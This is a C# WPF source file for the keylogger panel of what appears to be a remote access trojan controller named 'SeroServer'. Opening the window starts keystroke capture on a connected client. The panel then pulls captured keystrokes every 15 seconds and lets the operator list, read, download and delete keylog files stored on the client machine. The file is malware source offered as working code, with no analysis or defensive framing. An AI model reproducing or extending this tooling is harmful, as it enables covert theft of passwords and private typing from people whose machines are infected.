using System.IO;
using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class KeyloggerWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool               _capturing;
    private bool               _maximized;
    private string             _currentFilename = "";
    private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(15) };

    public KeyloggerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.KeyloggerLogsResult,  OnLogsResult);
        _server.RegisterHandler(clientId, PacketType.KeyloggerFilesResult, OnFilesResult);
        _server.RegisterHandler(clientId, PacketType.KeyloggerFileContent, OnFileContent);

        _autoRefresh.Tick += (_, _) => { if (_capturing) RequestLogs(); };

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.KeyloggerLogsResult);
            _server.UnregisterHandler(clientId, PacketType.KeyloggerFilesResult);
            _server.UnregisterHandler(clientId, PacketType.KeyloggerFileContent);
            _autoRefresh.Stop();
            ServerWindow.ReportGlobalActivity("Keylogger stopped", _clientId, "complete");
            ServerWindow.LogGlobal($"[KEYLOG] Keylogger stopped for client {_clientId}.");
        };

        // Auto-start capturing on open + load file list (staggered to avoid burst when many windows open)
        Loaded += async (_, _) =>
        {
            await Task.Delay(Random.Shared.Next(0, 250));
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
            _capturing = true; UpdateBadge(); _autoRefresh.Start();
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
            ServerWindow.ReportGlobalActivity("Keylogger started", _clientId, "complete");
            ServerWindow.LogGlobal($"[KEYLOG] Keylogger started for client {_clientId}.");
        };
    }

    // ── Outgoing ────────────────────────────────────────────────────────────

    private async void RequestLogs()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
    }

    private async void RequestFileList()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
        TxtStatus.Text = "Refreshing file list…";
    }

    // ── Incoming ────────────────────────────────────────────────────────────

    private void OnLogsResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
        if (data == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            _capturing = data.IsRunning;
            UpdateBadge();
            if (!string.IsNullOrEmpty(data.Logs))
            {
                NotificationService.NotifyKeylogReceived();
                TxtLog.AppendText(data.Logs);
                TxtLog.ScrollToEnd();
                TxtViewerTitle.Text = $"Live buffer — {_capturing}";
            }
            TxtStatus.Text = _capturing ? "Capturing — auto-sync every 15 s" : "Stopped";
        });
    }

    private void OnFilesResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerFilesResultData>(pkt.Data);
        if (data == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            _capturing = data.IsRunning;
            UpdateBadge();

            ListFiles.Items.Clear();
            foreach (var f in data.Files)
                ListFiles.Items.Add(new LogFileVM(f.Filename, f.Size));

            TxtStatus.Text = $"{data.Files.Count} log file(s) on client  —  capturing: {(_capturing ? "yes" : "no")}";
        });
    }

    private void OnFileContent(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerFileContentData>(pkt.Data);
        if (data == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            TxtLog.Text = data.Content;
            TxtViewerTitle.Text = data.Filename;
            TxtLog.ScrollToEnd();
            TxtStatus.Text = $"Loaded {data.Filename}  ({data.Content.Length:N0} chars)";
        });
    }

    // ── Button handlers ──────────────────────────────────────────────────────

    private void BtnRefresh_Click(object s, RoutedEventArgs e) => RequestFileList();

    private void ListFiles_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        try { System.Windows.Clipboard.SetText(vm.Filename); } catch { }
        TxtStatus.Text = $"Copied: {vm.Filename}";
    }

    private async void ListFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        _currentFilename = vm.Filename;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.KeyloggerGetFile,
            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
        });
        TxtStatus.Text = $"Loading {vm.Filename}…";
    }

    private async void BtnDelete_Click(object s, RoutedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        if (MessageBox.Show($"Delete '{vm.Filename}' from client?", "Confirm",
            MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.KeyloggerDeleteFile,
            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
        });
        ServerWindow.ReportGlobalActivity("Delete keylog", vm.Filename, "complete");
        ServerWindow.LogGlobal($"[KEYLOG] Deleted log file '{vm.Filename}' on client {_clientId}.");
        await Task.Delay(400);
        RequestFileList();
        TxtLog.Clear();
        TxtViewerTitle.Text = "Select a log file to view";
    }

    private void BtnDownload_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(TxtLog.Text) || string.IsNullOrEmpty(_currentFilename))
        { TxtStatus.Text = "Nothing to download — select a file first."; return; }

        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "Text Files (*.txt)|*.txt",
            FileName = _currentFilename
        };
        if (dlg.ShowDialog() != true) return;
        File.WriteAllText(dlg.FileName, TxtLog.Text, System.Text.Encoding.UTF8);
        TxtStatus.Text = $"Saved: {dlg.FileName}";
    }

    private void BtnSave_Click(object s, RoutedEventArgs e) => BtnDownload_Click(s, e);

    private void UpdateBadge()
        => BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;

    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _maximized = !_maximized;
        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
        BtnMax.Content = _maximized ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
            DragMove();
    }

    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}

public class LogFileVM
{
    public string Filename    { get; }
    public string DateDisplay { get; }
    public string SizeDisplay { get; }

    public LogFileVM(string filename, long size)
    {
        Filename    = filename;
        DateDisplay = System.IO.Path.GetFileNameWithoutExtension(filename);
        SizeDisplay = size < 1024 ? $"{size} B" : $"{size / 1024.0:F1} KB";
    }
}
